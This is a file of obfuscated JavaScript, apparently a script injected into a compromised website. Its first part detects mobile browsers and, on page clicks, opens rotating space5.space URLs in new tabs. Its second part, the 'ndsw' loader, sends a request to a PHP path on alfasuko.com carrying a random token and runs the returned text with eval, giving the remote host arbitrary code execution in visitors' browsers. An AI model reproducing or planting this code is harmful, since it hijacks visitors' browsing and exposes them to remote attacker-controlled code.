function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};